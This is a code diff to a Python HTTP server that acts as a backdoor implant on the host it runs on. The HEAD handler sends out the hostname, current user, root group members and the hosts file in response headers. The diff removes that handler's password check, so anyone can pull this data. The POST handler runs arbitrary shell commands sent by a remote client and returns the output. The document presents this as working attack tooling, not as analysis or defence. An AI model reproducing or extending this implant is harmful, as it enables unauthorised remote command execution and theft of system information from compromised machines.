@@ -12,8 +12,7 @@ def execCommand(command):
 
 class ReqHandler(BaseHTTPRequestHandler): 
     def do_HEAD(self): # exfiltrate basic system information
-        password = str(self.headers["pwd"])[2:-1]
-        if str(password) == str(config.password):
+        try:
             self.send_response(200)
             self.send_header("hostname", socket.gethostname()) # return system hostname
             self.send_header("current_user", execCommand(command="whoami")) # get current user
@@ -27,14 +26,15 @@ class ReqHandler(BaseHTTPRequestHandler):
             self.send_header("root_users", execCommand(command="grep root /etc/group")) # get all users with root access
             self.send_header("hosts_file", execCommand(command="cat /etc/hosts")) # return the hosts file contents
             self.end_headers()
-        else:
+        except:
             pass
 
     def do_POST(self): # run shell commands and return the output
-        password = str(self.headers["pwd"])[2:-1]
+        password = str(self.headers["pwd"])
         contentLength = int(self.headers["Content-Length"])
-        command = self.rfile.read(contentLength)[2:-1]
+        command = self.rfile.read(contentLength)
         if str(password) == str(config.password):
+            command = str(command)[2:-1] # remove bytes from command header
             self.send_response(200) # send HTTP status code
             cmd_output = execCommand(command=command)
             self.send_header("output", str(cmd_output))
